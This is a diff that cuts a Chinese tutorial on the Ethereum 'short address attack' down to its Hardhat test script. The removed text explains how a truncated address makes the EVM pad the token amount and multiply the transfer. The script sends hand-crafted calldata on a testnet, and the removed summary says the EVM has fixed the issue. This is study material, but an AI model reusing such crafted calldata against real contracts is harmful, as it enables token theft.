@@ -1,26 +1,3 @@
-
-
-# 第24节：安全事故14-短地址攻击
-
-如果传入的 to 是末端缺省的短地址，EVM 会将后面字节补足地址，而最后的 value 值不足则用 0 填充，导致实际转出的代币数值倍增，在执行transfer函数时，原型如下：
-
-```sh
-function transfer(address _to, uint256 _value) returns (bool success)`
-```
-
-在正常情况下，会给EVM传入136位的字节码（不包含0x），示例如下：
-
-```sh
-a9059cbb000000000000000000000000490e588126207a8132c8e002c8554e19cb380b7a000000000000000000000000000000000000000000000000000000003430bca1
-```
-
-但是，如果我们选择的_to地址后面正好有几个0（假设：3个0），而我们刻意将这3个0去掉，那么EVM会自动使用后面的 `_value`值的高位0对这缺失的3个0进行补位，同时EVM也会在`_value`后面进行再次3个补零，从而保证136位字节码完整，而这种机制导致的结果就是：原本value是1的时候，从后面补三个零，将value变成了1000，这相当于转账的值放大了1000倍（10^3）。
-
-
-
-## 代码验证
-
-```js
 import { ethers } from "hardhat";
 
 async function main() {
@@ -52,8 +29,8 @@ async function main() {
   // 2. 发起攻击 
   const tx = {
     // data: '0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b', //invalid data
-    data: '0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b',  // valid data
-    nonce: 1, //你发送交易的帐号的最后一笔交易的 nonce + 1
+    data: '0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b', // valid data
+    nonce: 1,//你发送交易的帐号的最后一笔交易的 nonce + 1
     gasLimit: '0x2dc6c0',
     gasPrice: '0x2540be400',
     value: '0x0',
@@ -62,6 +39,7 @@ async function main() {
 
   let signedTx = await sender.signTransaction(tx)
   console.log('signedTx:', signedTx);
+
 
   let res = await sender.sendTransaction(tx)
   console.log("tx hash:", res.hash);
@@ -73,19 +51,3 @@ main().catch((error) => {
   console.error(error);
   process.exitCode = 1;
 });
-
-```
-
-
-
-## 总结：EVM已经修复了
-
-1. 使用无效的data时，交易失败: https://goerli.etherscan.io/tx/0xd1efe66ce840bd9e6ecc4aabf54bcde2e20fd32c412377f8ff022f3407a0e2a6
-2. 使用有效的data时，交易成功: https://goerli.etherscan.io/tx/0x306b4f7713a3ea31b926242f5b6e5b8b1194e5f0316cf94b4b64ec80326eec8b*
-
-
-
-## 参考链接
-
-1. https://www.anquanke.com/post/id/159453
-2. https://www.freebuf.com/articles/network/247191.html
